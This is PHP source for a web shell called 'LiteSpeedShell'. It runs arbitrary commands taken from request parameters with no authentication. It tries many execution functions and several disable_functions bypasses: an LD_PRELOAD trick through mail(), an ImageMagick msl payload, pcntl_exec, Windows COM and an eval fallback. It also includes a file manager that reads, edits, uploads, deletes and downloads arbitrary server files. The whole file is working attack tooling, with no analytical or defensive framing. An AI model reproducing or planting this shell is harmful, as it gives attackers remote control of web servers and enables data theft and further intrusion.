class LiteSpeedShell {
    private $currentDir;
    private $disabledFuncs;
    private $bypassMethods = [];
    
    public function __construct() {
        $this->currentDir = isset($_GET['cd']) ? $this->sanitizePath($_GET['cd']) : getcwd();
        if(!$this->currentDir || !is_dir($this->currentDir)) $this->currentDir = getcwd();
        chdir($this->currentDir);
        $this->currentDir = realpath(getcwd());
        
        $this->disabledFuncs = ini_get('disable_functions') ?: '';
        $this->initBypassMethods();
    }
    
    private function sanitizePath($path) {
        $path = str_replace(['../', './', '..\\', '.\\'], '', $path);
        $real = realpath($path);
        return $real ? $real : getcwd();
    }
    
    private function initBypassMethods() {
        // Method 1: PHP Built-in functions
        $this->bypassMethods = [
            'shell_exec' => function($c) {
                return @shell_exec($c . ' 2>&1');
            },
            'exec' => function($c) {
                @exec($c . ' 2>&1', $output);
                return implode("\n", $output);
            },
            'system' => function($c) {
                ob_start();
                @system($c . ' 2>&1');
                return ob_get_clean();
            },
            'passthru' => function($c) {
                ob_start();
                @passthru($c . ' 2>&1');
                return ob_get_clean();
            },
            'popen' => function($c) {
                $handle = @popen($c . ' 2>&1', 'r');
                if(!$handle) return false;
                $output = '';
                while(!feof($handle)) {
                    $output .= fread($handle, 4096);
                }
                pclose($handle);
                return $output;
            },
            'proc_open' => function($c) {
                $descriptorspec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                $process = @proc_open($c, $descriptorspec, $pipes);
                if(!is_resource($process)) return false;
                
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                $error = stream_get_contents($pipes[2]);
                
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                
                return $output . ($error ? "\nError: " . $error : '');
            },
            'backticks' => function($c) {
                return @`$c 2>&1`;
            }
        ];
        
        // Method 2: PHP functions that can execute commands indirectly
        $this->bypassMethods['mail_ld_preload'] = function($c) {
            if(function_exists('mail')) {
                $temp = tempnam(sys_get_temp_dir(), 'ex_');
                file_put_contents($temp, "#!/bin/sh\n" . $c . "\n");
                chmod($temp, 0755);
                putenv("LD_PRELOAD=" . $temp);
                @mail('', '', '', '');
                unlink($temp);
                putenv("LD_PRELOAD");
                return "[+] LD_PRELOAD attempt completed";
            }
            return false;
        };
        
        // Method 3: ImageMagick bypass
        $this->bypassMethods['imagick'] = function($c) {
            if(class_exists('Imagick')) {
                $temp = tempnam(sys_get_temp_dir(), 'img_');
                $cmd = escapeshellarg($c);
                $payload = "vid:msl:/tmp/php*;{$cmd}";
                try {
                    $img = new Imagick();
                    $img->readImage($payload);
                    return "[+] Imagick bypass attempted";
                } catch(Exception $e) {
                    return false;
                }
            }
            return false;
        };
        
        // Method 4: PCNTL functions
        $this->bypassMethods['pcntl_exec'] = function($c) {
            if(function_exists('pcntl_exec')) {
                $args = explode(' ', $c);
                $program = array_shift($args);
                pcntl_exec($program, $args);
                return "[+] PCNTL executed";
            }
            return false;
        };
        
        // Method 5: COM objects (Windows)
        $this->bypassMethods['com_windows'] = function($c) {
            if(class_exists('COM')) {
                try {
                    $wsh = new COM("WScript.Shell");
                    $exec = $wsh->exec($c);
                    $stdout = $exec->StdOut->ReadAll();
                    return $stdout;
                } catch(Exception $e) {
                    return false;
                }
            }
            return false;
        };
    }
    
    public function execute($command) {
        $command = trim($command);
        
        // Handle CD command
        if(preg_match('/^\s*cd\s+(.+)$/', $command, $matches)) {
            $newDir = trim($matches[1], " \t\n\r\0\x0B\"'");
            if($newDir == '~' || $newDir == '$HOME') {
                $newDir = isset($_SERVER['HOME']) ? $_SERVER['HOME'] : '/';
            }
            
            if($newDir == '..') {
                $newDir = dirname($this->currentDir);
            }
            
            if(is_dir($newDir)) {
                $this->currentDir = realpath($newDir);
                chdir($this->currentDir);
                return "Changed directory to: " . $this->currentDir;
            } elseif(is_dir($this->currentDir . '/' . $newDir)) {
                $this->currentDir = realpath($this->currentDir . '/' . $newDir);
                chdir($this->currentDir);
                return "Changed directory to: " . $this->currentDir;
            } else {
                return "Directory not found: " . $newDir;
            }
        }
        
        // Execute actual command
        foreach($this->bypassMethods as $method => $callback) {
            if(!$this->isDisabled($method)) {
                $result = $callback($command);
                if($result !== false && $result !== null && trim($result) !== '') {
                    return $result;
                }
            }
        }
        
        // Fallback: Direct PHP execution
        if(function_exists('eval')) {
            ob_start();
            eval("system('$command 2>&1');");
            return ob_get_clean();
        }
        
        return "All execution methods failed or disabled";
    }
    
    private function isDisabled($func) {
        return stripos($this->disabledFuncs, $func) !== false;
    }
    
    public function getCurrentDir() {
        return $this->currentDir;
    }
    
    public function listFiles($dir = null) {
        $targetDir = $dir ?: $this->currentDir;
        $files = @scandir($targetDir);
        if(!$files) return "Cannot read directory";
        
        $output = "<table class='file-table'>";
        $output .= "<tr><th>Type</th><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>";
        
        // Parent directory
        if($targetDir != '/') {
            $parent = dirname($targetDir);
            $output .= "<tr class='folder'>
                <td>📁</td>
                <td><a href='?cd=" . urlencode($parent) . "'>..</a></td>
                <td>-</td>
                <td>-</td>
                <td>-</td>
                <td><button onclick=\"setCd('" . htmlspecialchars($parent) . "')\">Open</button></td>
            </tr>";
        }
        
        foreach($files as $file) {
            if($file == '.' || $file == '..') continue;
            
            $fullPath = $targetDir . '/' . $file;
            $isDir = is_dir($fullPath);
            $perms = $this->getPermissions($fullPath);
            $size = $isDir ? '-' : $this->formatSize(filesize($fullPath));
            $modified = date('Y-m-d H:i', filemtime($fullPath));
            
            $output .= "<tr class='" . ($isDir ? 'folder' : 'file') . "'>
                <td>" . ($isDir ? '📁' : '📄') . "</td>
                <td>";
            
            if($isDir) {
                $output .= "<a href='?cd=" . urlencode($fullPath) . "'>" . htmlspecialchars($file) . "</a>";
            } else {
                $output .= htmlspecialchars($file);
            }
            
            $output .= "</td>
                <td>{$size}</td>
                <td>{$perms}</td>
                <td>{$modified}</td>
                <td>";
            
            if(!$isDir) {
                $output .= "<button onclick=\"editFile('" . htmlspecialchars($fullPath) . "')\">Edit</button> ";
                $output .= "<button onclick=\"downloadFile('" . htmlspecialchars($fullPath) . "')\">Download</button> ";
            }
            $output .= "<button onclick=\"deleteFile('" . htmlspecialchars($fullPath) . "')\">Delete</button>
                </td>
            </tr>";
        }
        
        $output .= "</table>";
        return $output;
    }
    
    private function getPermissions($file) {
        if(!file_exists($file)) return '----';
        $perms = fileperms($file);
        $info = '';
        $info .= ($perms & 0x0100) ? 'r' : '-';
        $info .= ($perms & 0x0080) ? 'w' : '-';
        $info .= ($perms & 0x0040) ? 'x' : '-';
        $info .= ($perms & 0x0020) ? 'r' : '-';
        $info .= ($perms & 0x0010) ? 'w' : '-';
        $info .= ($perms & 0x0008) ? 'x' : '-';
        $info .= ($perms & 0x0004) ? 'r' : '-';
        $info .= ($perms & 0x0002) ? 'w' : '-';
        $info .= ($perms & 0x0001) ? 'x' : '-';
        return $info;
    }
    
    private function formatSize($bytes) {
        if($bytes == 0) return "0 B";
        $units = ['B', 'KB', 'MB', 'GB', 'TB'];
        $i = floor(log($bytes, 1024));
        return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
    }
    
    public function editFile($path, $content = null) {
        if(!file_exists($path)) return "File not found";
        
        if($content === null) {
            // Read file
            $content = file_get_contents($path);
            return [
                'content' => $content,
                'path' => $path,
                'size' => filesize($path)
            ];
        } else {
            // Write file
            if(!is_writable($path)) {
                if(!chmod($path, 0644)) {
                    return "Cannot write to file (permission denied)";
                }
            }
            file_put_contents($path, $content);
            return "File saved successfully";
        }
    }
}

// Initialize shell
$shell = new LiteSpeedShell();
$output = '';
$action = $_REQUEST['action'] ?? '';

// Handle actions
switch($action) {
    case 'exec':
        if(isset($_POST['cmd'])) {
            $output = $shell->execute($_POST['cmd']);
        }
        break;
        
    case 'browse':
        $dir = $_GET['dir'] ?? $shell->getCurrentDir();
        $output = $shell->listFiles($dir);
        break;
        
    case 'edit':
        if(isset($_POST['filepath']) && isset($_POST['content'])) {
            $output = $shell->editFile($_POST['filepath'], $_POST['content']);
        } elseif(isset($_GET['file'])) {
            $result = $shell->editFile($_GET['file']);
            if(is_array($result)) {
                $editFile = $result;
            }
        }
        break;
        
    case 'upload':
        if(isset($_FILES['uploadfile'])) {
            $target = $shell->getCurrentDir() . '/' . basename($_FILES['uploadfile']['name']);
            if(move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target)) {
                chmod($target, 0644);
                $output = "File uploaded: " . basename($_FILES['uploadfile']['name']);
            } else {
                $output = "Upload failed";
            }
        }
        break;
        
    case 'delete':
        if(isset($_GET['file'])) {
            if(unlink($_GET['file'])) {
                $output = "File deleted";
            } else {
                $output = "Delete failed";
            }
        }
        break;
        
    case 'download':
        if(isset($_GET['file']) && file_exists($_GET['file'])) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($_GET['file']) . '"');
            readfile($_GET['file']);
            exit;
        }
        break;
}

